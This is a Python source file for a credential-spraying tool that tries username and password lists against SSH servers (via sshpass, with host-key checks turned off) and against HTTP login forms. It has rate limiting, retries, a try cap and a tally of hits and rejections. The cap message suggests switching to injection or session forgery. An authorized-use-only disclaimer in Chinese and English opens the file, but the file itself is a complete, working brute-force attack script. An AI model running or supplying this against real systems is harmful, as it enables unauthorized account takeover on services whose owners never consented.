#!/usr/bin/env python3
"""授权使用声明 / AUTHORIZED-USE ONLY

本工具仅供安全研究、教学与经授权的渗透测试 / CTF 使用；使用前须确保对目标具备合法授权，
禁止用于任何未经授权的系统；滥用后果自负，作者不承担责任。
For authorized security testing / CTF only. You must have explicit permission for any
target; unauthorized use is prohibited; the author assumes no liability for misuse.
"""
from __future__ import annotations

import argparse
import itertools
import shlex
import shutil
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

EXIT_HIT, EXIT_NONE, EXIT_USAGE, EXIT_DEP = 0, 1, 2, 3

_OPENER = urllib.request.build_opener(urllib.request.ProxyHandler({}))


def _load_list(spec: str) -> list:
    if not spec:
        return []
    if spec.startswith("@"):
        with open(spec[1:], encoding="utf-8", errors="replace") as f:
            return [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]
    return [p.strip() for p in spec.split(",") if p.strip()]


class _Tally:
    def __init__(self):
        self.tried = self.auth_rejected = self.transport_failed = self.ambiguous = self.hits = 0
        self.retried_ok = 0

    def summary(self) -> str:
        return (f"SUMMARY tried={self.tried} auth_rejected={self.auth_rejected} "
                f"transport_failed={self.transport_failed} ambiguous={self.ambiguous} "
                f"hits={self.hits} retried_ok={self.retried_ok}")


def _dep_check(mode: str) -> int:
    missing = []
    if mode == "ssh":
        import os
        if not shutil.which(os.environ.get("AUTHSPRAY_SSHPASS_BIN", "sshpass")):
            missing.append(os.environ.get("AUTHSPRAY_SSHPASS_BIN", "sshpass"))
        sshb = os.environ.get("AUTHSPRAY_SSH_BIN", "ssh")
        if not shutil.which(shlex.split(sshb)[0]):
            missing.append(sshb)
    if missing:
        print(f"DEPENDENCY-MISSING: {', '.join(missing)} — install it or switch mode; "
              f"do NOT grep-this-error into a fake HIT.", flush=True)
        return EXIT_DEP
    return 0


def _ssh_attempt(host: str, port: str, user: str, password: str) -> str:
    import os
    sshpass = os.environ.get("AUTHSPRAY_SSHPASS_BIN", "sshpass")
    ssh = shlex.split(os.environ.get("AUTHSPRAY_SSH_BIN", "ssh"))
    argv = [sshpass, "-p", password] + ssh + [
        "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
        "-o", "ConnectTimeout=6", "-o", "NumberOfPasswordPrompts=1",
        "-p", str(port), f"{user}@{host}", "true"]
    try:
        r = subprocess.run(argv, capture_output=True, text=True, timeout=15)
    except (subprocess.TimeoutExpired, OSError):
        return "transport"
    rc = r.returncode
    if rc == 0:
        return "hit"
    if rc == 5:
        return "reject"
    if rc == 6:
        return "reject"
    return "transport"


def _http_attempt(url: str, up: str, pp: str, user: str, password: str,
                  hit_mark: str, fail_mark: str) -> str:
    data = urllib.parse.urlencode({up: user, pp: password}).encode()
    req = urllib.request.Request(url, data=data,
                                 headers={"Content-Type": "application/x-www-form-urlencoded"})
    try:
        with _OPENER.open(req, timeout=8) as r:
            body = r.read(65536).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        if e.code in (502, 504):
            return "transport"
        try:
            body = e.read(65536).decode("utf-8", "replace")
        except Exception:
            body = ""
    except (urllib.error.URLError, TimeoutError, OSError):
        return "transport"
    if hit_mark and hit_mark in body:
        return "hit"
    if fail_mark and fail_mark in body:
        return "reject"
    return "ambiguous"


def main() -> int:
    print((__doc__ or "").strip(), file=sys.stderr)
    ap = argparse.ArgumentParser(description="credential spray with honest accounting")
    sub = ap.add_subparsers(dest="mode", required=True)
    ps = sub.add_parser("ssh")
    ps.add_argument("--host", required=True)
    ps.add_argument("-p", "--port", default="22")
    for p in (ps,):
        p.add_argument("--users", required=True)
        p.add_argument("--passwords", required=True)
        p.add_argument("--rate", type=float, default=1.0)
        p.add_argument("--retries", type=int, default=2)
        p.add_argument("--max-tries", type=int, default=200,
                       help="小而准上限：到限即停并打印 SPRAY-CAP（大字典会打死脆弱靶机）")
        p.add_argument("--continue-after-hit", action="store_true")
    ph = sub.add_parser("http")
    ph.add_argument("--url", required=True)
    ph.add_argument("--user-param", default="username")
    ph.add_argument("--pass-param", default="password")
    ph.add_argument("--users", required=True)
    ph.add_argument("--passwords", required=True)
    ph.add_argument("--hit-mark", default="")
    ph.add_argument("--fail-mark", default="")
    ph.add_argument("--rate", type=float, default=0.5)
    ph.add_argument("--retries", type=int, default=2)
    ph.add_argument("--max-tries", type=int, default=200)
    ph.add_argument("--continue-after-hit", action="store_true")
    a = ap.parse_args()

    rc = _dep_check(a.mode)
    if rc:
        return rc
    users, passwords = _load_list(a.users), _load_list(a.passwords)
    if not users or not passwords:
        print("USAGE-ERROR: empty users/passwords list", flush=True)
        return EXIT_USAGE
    if a.mode == "http" and not (a.hit_mark or a.fail_mark):
        print("USAGE-ERROR: http mode needs --hit-mark or --fail-mark (anti-false-positive)",
              flush=True)
        return EXIT_USAGE

    t = _Tally()
    for user, password in itertools.product(users, passwords):
        t.tried += 1
        outcome = None
        for attempt in range(1 + max(0, a.retries)):
            if a.mode == "ssh":
                outcome = _ssh_attempt(a.host, a.port, user, password)
            else:
                outcome = _http_attempt(a.url, a.user_param, a.pass_param, user, password,
                                        a.hit_mark, a.fail_mark)
            if outcome != "transport":
                if attempt:
                    t.retried_ok += 1
                    print(f"[retried-ok] {user} (after {attempt} transport failure(s))", flush=True)
                break
            print(f"[transport-error] {user}@{a.host if a.mode == 'ssh' else a.url} "
                  f"(attempt {attempt + 1}/{1 + a.retries}) — NOT an auth answer", flush=True)
            time.sleep(min(1.0 * (attempt + 1), 3.0))
        if outcome == "hit":
            t.hits += 1
            print(f"HIT: {user} / {password}", flush=True)
            if not a.continue_after_hit:
                print(t.summary(), flush=True)
                return EXIT_HIT
        elif outcome == "reject":
            t.auth_rejected += 1
            print(f"[auth-reject] {user}", flush=True)
        elif outcome == "transport":
            t.transport_failed += 1
            print(f"[transport-FAILED] {user} — exhausted retries; this pair is UNTESTED, "
                  f"not rejected (re-run later, check reachability)", flush=True)
        else:
            t.ambiguous += 1
            print(f"[ambiguous] {user} — response matched neither mark; not counted as hit", flush=True)
        time.sleep(max(0.0, a.rate))
        if t.hits == 0 and t.tried >= max(1, a.max_tries):
            print(f"SPRAY-CAP: reached --max-tries {a.max_tries} (小而准上限) — 停止喷射；"
                  f"换攻击面/方法（源码审计、注入、session 伪造、其他入口），不是换更大的字典",
                  flush=True)
            print(t.summary(), flush=True)
            return EXIT_NONE
    print(t.summary(), flush=True)
    return EXIT_NONE


if __name__ == "__main__":
    sys.exit(main())
